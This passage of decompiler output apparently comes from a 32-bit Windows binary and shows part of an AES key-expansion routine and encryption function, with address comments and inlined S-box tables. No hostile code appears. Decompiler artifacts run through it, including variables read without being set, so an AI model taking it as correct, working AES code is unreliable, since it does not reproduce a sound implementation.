                v48 = *(char *)((v45 / 256 & 255) + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                v49 = *(char *)((v45 & 255) + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                v50 = *v37;
                v51 = *v39;
                v52 = (256 * (256 * (256 * (int32_t)(v47 ^ v46) | (int32_t)v48) | (int32_t)v49) | (int32_t)v50) ^ v51;
                *v39 = v52;
                if (v33 == 8) {
                    // 0x402d32
                    *v41 = 3;
                    v61 = *v39;
                    v55 = v40;
                    v62 = 3;
                    v60 = (int32_t *)v55;
                    v61 ^= *v60;
                    *v60 = v61;
                    v62--;
                    v55 += 4;
                    while (v62 != 0) {
                        // 0x402d3b
                        v60 = (int32_t *)v55;
                        v61 ^= *v60;
                        *v60 = v61;
                        v62--;
                        v55 += 4;
                    }
                    // 0x402d46
                    v66 = *(int32_t *)(v2 + 1056);
                    *v41 = 3;
                    v67 = *v37;
                    v68 = *v36;
                    v69 = *(char *)((v66 / 256 & 255) + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                    v70 = *(char *)((v66 & 255) + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16");
                    v71 = *v42;
                    v72 = (256 * (256 * (256 * (int32_t)v67 | (int32_t)v68) | (int32_t)v69) | (int32_t)v70) ^ v71;
                    *v42 = v72;
                    v58 = v72;
                    v56 = v2 + 1064;
                    v59 = *v41;
                    v73 = (int32_t *)v56;
                    v58 ^= *v73;
                    *v73 = v58;
                    v59--;
                    v56 += 4;
                    while (v59 != 0) {
                        // 0x402d9c
                        v73 = (int32_t *)v56;
                        v58 ^= *v73;
                        *v73 = v58;
                        v59--;
                        v56 += 4;
                    }
                } else {
                    // 0x402d13
                    v53 = v52;
                    v54 = v40;
                    if (v33 >= 2) {
                        v63 = (int32_t *)v54;
                        v64 = *v63 ^ v53;
                        *v63 = v64;
                        v65 = v33 - 2;
                        v53 = v64;
                        v54 += 4;
                        v57 = v65;
                        while (v65 != 0) {
                            // 0x402d25
                            v63 = (int32_t *)v54;
                            v64 = *v63 ^ v53;
                            *v63 = v64;
                            v65 = v57 - 1;
                            v53 = v64;
                            v54 += 4;
                            v57 = v65;
                        }
                    }
                }
                int32_t v85 = v84; // 0x402dad
                v74 = v38;
                v75 = v84;
                if (v33 >= 1) {
                    v77 = v85;
                    if (v77 >= v34) {
                        // break (via goto) -> 0x402e04
                        goto lab_0x402e04;
                    }
                    // 0x402dba
                    v78 = (int32_t *)v74;
                    v79 = 0x100000000 * (int64_t)(v77 / 0x80000000) | (int64_t)v77;
                    v80 = v79 / v43;
                    v81 = v79 % v43;
                    *(int32_t *)(v2 + 8 + 4 * (8 * v80 + v81)) = *v78;
                    v82 = 1;
                    v83 = v77 + 1;
                    *(int32_t *)(v2 + 488 + 4 * (8 * (*v6 - v80) + v81)) = *v78;
                    v76 = v82;
                    v74 += 4;
                    v75 = v83;
                    while (v82 < v33) {
                        // 0x402db5
                        v77 = v83;
                        if (v77 >= v34) {
                            // break (via goto) -> 0x402e04
                            goto lab_0x402e04;
                        }
                        // 0x402dba
                        v78 = (int32_t *)v74;
                        v79 = 0x100000000 * (int64_t)(v77 / 0x80000000) | (int64_t)v77;
                        v80 = v79 / v43;
                        v81 = v79 % v43;
                        *(int32_t *)(v2 + 8 + 4 * (8 * v80 + v81)) = *v78;
                        v82 = v76 + 1;
                        v83 = v77 + 1;
                        *(int32_t *)(v2 + 488 + 4 * (8 * (*v6 - v80) + v81)) = *v78;
                        v76 = v82;
                        v74 += 4;
                        v75 = v83;
                    }
                }
                // 0x402dfb
                v84 = v75;
                v44 = (char *)((int32_t)v44 + 1);
            }
        }
    } else {
        int32_t v86 = v2 + 1044;
        int32_t v87 = v33; // 0x402c24
        int32_t v88 = v86; // 0x402c24
        int32_t v89 = (int32_t)a1; // 0x402c24
        int32_t v90 = 0x1000000 * (int32_t)*(char *)v89; // 0x402c2a
        int32_t * v91 = (int32_t *)v88; // 0x402c2e
        *v91 = v90;
        int32_t v92 = 0x10000 * (int32_t)*(char *)(v89 + 1) | v90; // 0x402c36
        *v91 = v92;
        int32_t v93 = 256 * (int32_t)*(char *)(v89 + 2) | v92; // 0x402c3d
        *v91 = v93;
        *v91 = v93 | (int32_t)*(char *)(v89 + 3);
        v87--;
        v88 += 4;
        v89 += 4;
        while (v87 != 0) {
            // 0x402c27
            v90 = 0x1000000 * (int32_t)*(char *)v89;
            v91 = (int32_t *)v88;
            *v91 = v90;
            v92 = 0x10000 * (int32_t)*(char *)(v89 + 1) | v90;
            *v91 = v92;
            v93 = 256 * (int32_t)*(char *)(v89 + 2) | v92;
            *v91 = v93;
            *v91 = v93 | (int32_t)*(char *)(v89 + 3);
            v87--;
            v88 += 4;
            v89 += 4;
        }
        uint64_t v94 = v16 & 0xffffffff;
        int32_t v95 = 0; // 0x402c56
        int32_t v96 = v86; // 0x402c56
        while (v95 < v34) {
            int32_t * v97 = (int32_t *)v96; // 0x402c68
            uint64_t v98 = (int64_t)v95; // 0x402c6b
            int32_t v99 = v98 / v94; // 0x402c6b
            int32_t v100 = v98 % v94; // 0x402c75
            *(int32_t *)(v2 + 8 + 4 * (8 * v99 + v100)) = *v97;
            v95++;
            *(int32_t *)(v2 + 488 + 4 * (8 * (*v6 - v99) + v100)) = *v97;
            v96 += 4;
            v35 = v95;
            if (v95 >= v33) {
                goto lab_0x402ca5;
            }
        }
    }
  lab_0x402e04:
    // 0x402e04
    *(int32_t *)(v32 - 4) = 1;
    int32_t v101 = *v6; // 0x402e07
    if (v101 < 2) {
        // 0x402e73
        *(char *)(v2 + 4) = 1;
        return 1;
    }
    int32_t v102 = v2 + 520; // 0x402e18
    int32_t v103 = v102; // 0x402e20
    int32_t v104 = v101; // 0x402e20
    int32_t v105; // 0x402a76
    int32_t * v106; // 0x402e25
    uint32_t v107; // 0x402e25
    int32_t v108; // 0x402e34
    int32_t v109; // 0x402e3b
    int32_t v110; // 0x402e4b
    int32_t v111; // 0x402e52
    int32_t v112; // 0x402e5e
    if (v17 >= 1) {
        v106 = (int32_t *)v103;
        v107 = *v106;
        v108 = *(int32_t *)((4 * a3 & 1020) + (int32_t)&g3);
        v109 = *(int32_t *)((4 * a2 & 1020) + (int32_t)&g4);
        v110 = *(int32_t *)((v107 / 64 & 1020) + (int32_t)&g5);
        v111 = *(int32_t *)((4 * v107 & 1020) + (int32_t)&g6);
        *v106 = v109 ^ v108 ^ v110 ^ v111;
        v112 = v17 - 1;
        v105 = v112;
        v103 += 4;
        while (v112 != 0) {
            // 0x402e25
            v106 = (int32_t *)v103;
            v107 = *v106;
            v108 = *(int32_t *)((4 * a3 & 1020) + (int32_t)&g3);
            v109 = *(int32_t *)((4 * a2 & 1020) + (int32_t)&g4);
            v110 = *(int32_t *)((v107 / 64 & 1020) + (int32_t)&g5);
            v111 = *(int32_t *)((4 * v107 & 1020) + (int32_t)&g6);
            *v106 = v109 ^ v108 ^ v110 ^ v111;
            v112 = v105 - 1;
            v105 = v112;
            v103 += 4;
        }
        // 0x402e61
        v104 = *v6;
    }
    int32_t result = (int32_t)(char *)1 + 1; // 0x402e61
    int32_t v113 = v104; // 0x402e71
    v102 += 32;
    char * v114 = (char *)result; // 0x402e71
    while (result < v104) {
        // 0x402e1b
        v103 = v102;
        v104 = v113;
        if (v17 >= 1) {
            v106 = (int32_t *)v103;
            v107 = *v106;
            v108 = *(int32_t *)((4 * a3 & 1020) + (int32_t)&g3);
            v109 = *(int32_t *)((4 * a2 & 1020) + (int32_t)&g4);
            v110 = *(int32_t *)((v107 / 64 & 1020) + (int32_t)&g5);
            v111 = *(int32_t *)((4 * v107 & 1020) + (int32_t)&g6);
            *v106 = v109 ^ v108 ^ v110 ^ v111;
            v112 = v17 - 1;
            v105 = v112;
            v103 += 4;
            while (v112 != 0) {
                // 0x402e25
                v106 = (int32_t *)v103;
                v107 = *v106;
                v108 = *(int32_t *)((4 * a3 & 1020) + (int32_t)&g3);
                v109 = *(int32_t *)((4 * a2 & 1020) + (int32_t)&g4);
                v110 = *(int32_t *)((v107 / 64 & 1020) + (int32_t)&g5);
                v111 = *(int32_t *)((4 * v107 & 1020) + (int32_t)&g6);
                *v106 = v109 ^ v108 ^ v110 ^ v111;
                v112 = v105 - 1;
                v105 = v112;
                v103 += 4;
            }
            // 0x402e61
            v104 = *v6;
        }
        // 0x402e61
        result = (int32_t)v114 + 1;
        v113 = v104;
        v102 += 32;
        v114 = (char *)result;
    }
    // 0x402e73
    *(char *)(v2 + 4) = 1;
    return result;
  lab_0x402b94:;
    int32_t v115 = v2 + 1040;
    int32_t * v116 = (int32_t *)v115;
    *v116 = v9;
    v8 = v9;
    v6 = v116;
    v7 = v115;
    goto lab_0x402bb3;
}

// Address range: 0x402e7e - 0x4031bc
// Used cryptographic patterns:
//  - AES_Rijndael_S___ARIA_S1 (8-bit)
//  - Rijndael_Te0__0xc66363a5U_ (32-bit, little endian)
//  - Rijndael_Te1__0xa5c66363U_ (32-bit, little endian)
//  - Rijndael_Te2__0x63a5c663U_ (32-bit, little endian)
//  - Rijndael_Te3__0x6363a5c6U_ (32-bit, little endian)
int32_t function_402e7e(int32_t a1, int32_t result) {
    // 0x402e7e
    int32_t v1; // 0x402e7e
    if (*(char *)(v1 + 4) == 0) {
        // 0x402e90
        int32_t v2; // bp-44, 0x402e7e
        _3f__3f_0exception_40__40_QAE_40_ABQBD_40_Z((char **)&v2);
        _CxxThrowException(&v2, &g17);
        // UNREACHABLE
    }
    unsigned char v3 = *(char *)(a1 + 3); // 0x402ecb
    int32_t v4 = *(int32_t *)(v1 + 8); // 0x402ed5
    int32_t v5 = (256 * (int32_t)*(char *)(a1 + 2) | (int32_t)v3) ^ v4; // 0x402ed5
    int32_t v6 = *(int32_t *)(v1 + 12) ^ (int32_t)*(char *)(a1 + 7); // 0x402ef6
    unsigned char v7 = *(char *)(a1 + 11); // 0x402f12
    int32_t v8 = *(int32_t *)(v1 + 16); // 0x402f18
    int32_t v9 = (256 * (int32_t)*(char *)(a1 + 10) | (int32_t)v7) ^ v8; // 0x402f18
    int32_t v10 = *(int32_t *)(v1 + 1040); // 0x402f36
    int32_t v11 = *(int32_t *)(v1 + 20) ^ (int32_t)*(char *)(a1 + 15); // 0x402f41
    int32_t v12; // 0x402e7e
    int32_t v13; // 0x402e7e
    int32_t v14; // 0x402e7e
    int32_t v15; // 0x402e7e
    int32_t v16; // 0x402e7e
    int32_t v17; // 0x402e7e
    int32_t v18; // 0x402e7e
    int32_t v19; // 0x402e7e
    int32_t v20; // 0x402e7e
    int32_t v21; // 0x402e7e
    int32_t v22; // 0x402e7e
    int32_t v23; // 0x402e7e
    int32_t v24; // 0x402e7e
    int32_t v25; // 0x402e7e
    char v26; // 0x402e7e
    if (v10 < 2) {
        // 0x402eac
        v19 = v26;
        v18 = v26;
        v17 = v26;
        v16 = v26;
        v15 = v26;
        v14 = v26;
        v13 = v26;
        v12 = v26;
        v20 = v26;
        v21 = v26;
        v23 = v11;
        v24 = v6;
        v25 = v5;
        v22 = v9;
    } else {
        int32_t v27 = v26;
        int32_t v28 = v26;
        int32_t v29 = *(int32_t *)(4 * v27 + (int32_t)&Rijndael_Te2__0x63a5c663U__at_4093fc); // 0x402f69
        int32_t v30 = *(int32_t *)(4 * v28 + (int32_t)&Rijndael_Te1__0xa5c66363U__at_408ffc); // 0x402f72
        int32_t v31 = v26;
        int32_t v32 = *(int32_t *)(4 * v31 + (int32_t)&Rijndael_Te0__0xc66363a5U__at_408bfc); // 0x402f7e
        int32_t v33 = v26;
        int32_t v34 = v26;
        int32_t v35 = *(int32_t *)(4 * v34 + (int32_t)&Rijndael_Te1__0xa5c66363U__at_408ffc); // 0x402f9e
        int32_t v36 = *(int32_t *)(4 * v33 + (int32_t)&Rijndael_Te0__0xc66363a5U__at_408bfc); // 0x402fa5
        int32_t v37 = v26;
        int32_t v38 = v26;
        int32_t v39 = *(int32_t *)(4 * v38 + (int32_t)&Rijndael_Te0__0xc66363a5U__at_408bfc); // 0x402fde
        int32_t v40 = *(int32_t *)(4 * v37 + (int32_t)&Rijndael_Te2__0x63a5c663U__at_4093fc); // 0x402fe5
        int32_t v41 = v26;
        int32_t v42 = *(int32_t *)(4 * v41 + (int32_t)&Rijndael_Te1__0xa5c66363U__at_408ffc); // 0x402ff1
        int32_t v43 = v26;
        int32_t v44 = *(int32_t *)(4 * v43 + (int32_t)&Rijndael_Te1__0xa5c66363U__at_408ffc); // 0x403019
        int32_t v45 = v26;
        int32_t v46 = *(int32_t *)(4 * v45 + (int32_t)&Rijndael_Te0__0xc66363a5U__at_408bfc); // 0x403025
        int32_t v47 = v10 - 1; // 0x402f5c
        int32_t v48 = v1 + 48; // 0x402f5c
        int32_t v49 = *(int32_t *)((4 * v5 & 1020) + (int32_t)&Rijndael_Te3__0x6363a5c6U__at_4097fc); // 0x402f8c
        int32_t v50 = v30 ^ v29 ^ v32 ^ v49 ^ *(int32_t *)(v48 - 4); // 0x402f96
        int32_t v51 = *(int32_t *)((v5 / 64 & 1020) + (int32_t)&Rijndael_Te2__0x63a5c663U__at_4093fc); // 0x402fb5
        int32_t v52 = *(int32_t *)((4 * v6 & 1020) + (int32_t)&Rijndael_Te3__0x6363a5c6U__at_4097fc); // 0x402fc2
        int32_t v53 = v36 ^ v35 ^ v51 ^ v52 ^ *(int32_t *)v48; // 0x402fcf
        int32_t v54 = *(int32_t *)((4 * v9 & 1020) + (int32_t)&Rijndael_Te3__0x6363a5c6U__at_4097fc); // 0x402ffc
        int32_t v55 = v40 ^ v39 ^ v42 ^ v54 ^ *(int32_t *)(v48 + 4); // 0x40300c
        int32_t v56 = *(int32_t *)((v9 / 64 & 1020) + (int32_t)&Rijndael_Te2__0x63a5c663U__at_4093fc); // 0x40300f
        int32_t v57 = *(int32_t *)((4 * v11 & 1020) + (int32_t)&Rijndael_Te3__0x6363a5c6U__at_4097fc); // 0x403034
        int32_t v58 = v46 ^ v44 ^ v56 ^ v57 ^ *(int32_t *)(v48 - 8); // 0x403041
        v47--;
        v48 += 32;
        v19 = v37;
        v18 = v41;
        v17 = v38;
        v16 = v34;
        v15 = v33;
        v14 = v27;
        v13 = v28;
        v12 = v31;
        v20 = v43;
        v21 = v45;
        v23 = v55;
        v24 = v50;
        v25 = v58;
        v22 = v53;
        while (v47 != 0) {
            uint32_t v59 = v53;
            int32_t v60 = v50;
            int32_t v61 = v55;
            v49 = *(int32_t *)((4 * v58 & 1020) + (int32_t)&Rijndael_Te3__0x6363a5c6U__at_4097fc);
            v50 = v30 ^ v29 ^ v32 ^ v49 ^ *(int32_t *)(v48 - 4);
            v51 = *(int32_t *)((v58 / 64 & 1020) + (int32_t)&Rijndael_Te2__0x63a5c663U__at_4093fc);
            v52 = *(int32_t *)((4 * v60 & 1020) + (int32_t)&Rijndael_Te3__0x6363a5c6U__at_4097fc);
            v53 = v36 ^ v35 ^ v51 ^ v52 ^ *(int32_t *)v48;
            v54 = *(int32_t *)((4 * v59 & 1020) + (int32_t)&Rijndael_Te3__0x6363a5c6U__at_4097fc);
            v55 = v40 ^ v39 ^ v42 ^ v54 ^ *(int32_t *)(v48 + 4);
            v56 = *(int32_t *)((v59 / 64 & 1020) + (int32_t)&Rijndael_Te2__0x63a5c663U__at_4093fc);
            v57 = *(int32_t *)((4 * v61 & 1020) + (int32_t)&Rijndael_Te3__0x6363a5c6U__at_4097fc);
            v58 = v46 ^ v44 ^ v56 ^ v57 ^ *(int32_t *)(v48 - 8);
            v47--;
            v48 += 32;
            v19 = v37;
            v18 = v41;
            v17 = v38;
            v16 = v34;
            v15 = v33;
            v14 = v27;
            v13 = v28;
            v12 = v31;
            v20 = v43;
            v21 = v45;
            v23 = v55;
            v24 = v50;
            v25 = v58;
            v22 = v53;
        }
    }
    int32_t v62 = (32 * v10 | 8) + v1; // 0x403059
    uint32_t v63 = *(int32_t *)v62; // 0x403059
    char v64 = *(char *)(v21 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x40306e
    *(char *)result = v64 ^ (char)(v63 / 0x1000000);
    char v65 = *(char *)(v20 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x403085
    *(char *)(result + 1) = v65 ^ (char)(v63 / 0x10000);
    char v66 = *(char *)((v22 / 256 & 255) + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x40309a
    *(char *)(result + 2) = v66 ^ (char)(v63 / 256);
    char v67 = *(char *)((v23 & 255) + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x4030af
    *(char *)(result + 3) = v67 ^ (char)v63;
    uint32_t v68 = *(int32_t *)(v62 + 4); // 0x4030bb
    char v69 = *(char *)(v12 + (int32_t)"c|w{\xf2ko\xc5\x30\x01g+\xfe\xd7\xabv\xca\x82\xc9}\xfaYG\xf0\xad\xd4\xa2\xaf\x9c\xa4r\xc0\xb7\xfd\x93&6?\xf7\xcc\x34\xa5\xe5\xf1q\xd8\x31\x15\x04\xc7#\xc3\x18\x96\x05\x9a\a\x12\x80\xe2\xeb'\xb2u\t\x83,\x1a\x1bnZ\xa0R;\xd6\xb3)\xe3/\x84S\xd1\x00\xed \xfc\xb1[j\xcb\xbe\x39JLX\xcf\xd0\xef\xaa\xfb\x43M3\x85\x45\xf9\x02\x7fP<\x9f\xa8Q\xa3@\x8f\x92\x9d\x38\xf5\xbc\xb6\xda!\x10\xff\xf3\xd2\xcd\f\x13\xec_\x97\x44\x17\xc4\xa7~=d]\x19s`\x81O\xdc\"*\x90\x88\x46\xee\xb8\x14\xde^\v\xdb\xe0\x32:\nI\x06$\\\xc2\xd3\xac\x62\x91\x95\xe4y\xe7\xc8\x37m\x8d\xd5N\xa9lV\xf4\xea\x65z\xae\b\xbax%.\x1c\xa6\xb4\xc6\xe8\xddt\x1fK\xbd\x8b\x8ap>\xb5\x66H\x03\xf6\x0e\x61\x35W\xb9\x86\xc1\x1d\x9e\xe1\xf8\x98\x11i\xd9\x8e\x94\x9b\x1e\x87\xe9\xceU(\xdf\x8c\xa1\x89\r\xbf\xe6\x42hA\x99-\x0f\xb0T\xbb\x16"); // 0x4030be
    *(char *)(result + 4) = v69 ^ (char)(v68 / 0x1000000);
